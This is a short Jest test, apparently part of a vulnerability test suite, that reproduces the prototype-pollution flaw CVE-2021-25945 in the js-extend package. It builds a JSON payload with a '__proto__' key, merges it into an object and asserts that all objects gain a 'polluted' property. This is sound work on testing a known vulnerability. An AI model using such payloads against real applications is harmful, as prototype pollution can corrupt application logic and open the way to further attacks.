//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25945
test("prototype pollution in js-extend", () => {
  expect({}.polluted).toBe(undefined);

  const jsExtend = require("js-extend");
  const malicious_payload = '{"__proto__":{"polluted":"yes"}}';
  jsExtend.extend({}, JSON.parse(malicious_payload));

  expect({}.polluted).toBe("yes");
});
